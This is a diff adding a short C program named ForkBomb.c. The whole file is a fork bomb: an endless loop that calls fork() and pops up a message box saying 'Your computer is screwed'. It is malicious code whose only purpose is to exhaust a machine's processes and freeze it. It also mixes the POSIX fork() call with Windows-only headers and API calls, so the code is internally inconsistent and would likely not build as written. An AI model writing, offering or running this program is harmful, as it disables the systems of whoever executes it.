@@ -1,0 +1,18 @@
+/*
+ * ForkBomb.c
+ *
+ *  Created on: Jun 16, 2016
+ *      Author: Barrett
+ */
+#include <stdio.h>
+#include <unistd.h>
+#include <windows.h>
+
+int main(){
+
+	while(1){
+		fork();
+		MessageBox(0,"Your computer is screwed", "Fork Bomb", MB_OK);
+	}
+}
+
